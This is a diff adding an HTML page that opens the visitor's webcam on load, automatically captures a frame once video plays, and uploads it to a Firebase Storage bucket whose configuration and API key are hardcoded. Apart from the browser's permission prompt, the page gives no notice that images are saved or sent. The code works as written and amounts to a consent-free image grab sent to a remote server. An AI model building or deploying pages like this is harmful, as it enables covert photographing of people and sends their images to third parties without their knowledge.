@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Auto Capture Screenshot from Webcam</title>
+</head>
+
+<body>
+
+  <video autoplay id="stream"></video>
+  <canvas id="screenshotCanvas" style="display: none;"></canvas>
+  <img id="screenshotImage" alt="Screenshot">
+
+  <style>
+    video {
+      width: 100%;
+      height: 100vh;
+    }
+  </style>
+
+  <!-- Firebase Configuration -->
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCLiY-6AlJXtGKBzj0E-4LpexzG1olbfPM",
+  authDomain: "camera-screenshot.firebaseapp.com",
+  projectId: "camera-screenshot",
+  storageBucket: "camera-screenshot.appspot.com",
+  messagingSenderId: "168265982808",
+  appId: "1:168265982808:web:0c49c4596088b95a0a7b2d",
+  measurementId: "G-5KNR1NYHZZ"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    const cameraFeed = document.getElementById("stream");
+    const screenshotCanvas = document.getElementById("screenshotCanvas");
+    const screenshotImage = document.getElementById("screenshotImage");
+
+    // Function to capture a screenshot
+    function captureScreenshot() {
+      const context = screenshotCanvas.getContext("2d");
+      screenshotCanvas.width = cameraFeed.videoWidth;
+      screenshotCanvas.height = cameraFeed.videoHeight;
+      context.drawImage(cameraFeed, 0, 0, screenshotCanvas.width, screenshotCanvas.height);
+
+      // Convert the screenshot to a data URL
+      const screenshotDataUrl = screenshotCanvas.toDataURL("image/png");
+
+      // Display the screenshot as an image
+      screenshotImage.src = screenshotDataUrl;
+      screenshotImage.style.display = "block";
+
+      // Get a reference to Firebase Storage
+      const storageRef = firebase.storage().ref();
+
+      // Generate a unique filename for the screenshot (e.g., timestamp)
+      const filename = `${Date.now()}_screenshot.png`;
+
+      // Upload the screenshot to Firebase Storage
+      const screenshotRef = storageRef.child(`screenshots/${filename}`);
+      screenshotRef.putString(screenshotDataUrl, 'data_url').then(() => {
+        console.log("Screenshot uploaded to Firebase Storage.");
+      }).catch(error => {
+        console.error("Error uploading screenshot:", error);
+      });
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      cameraFeed.srcObject = stream;
+
+      // Add an event listener to capture a screenshot when the video starts playing
+      cameraFeed.addEventListener("playing", () => {
+        captureScreenshot();
+      });
+    }).catch(error => {
+      console.log("Error accessing camera:", error);
+    });
+  </script>
+
+</body>
+
+</html>
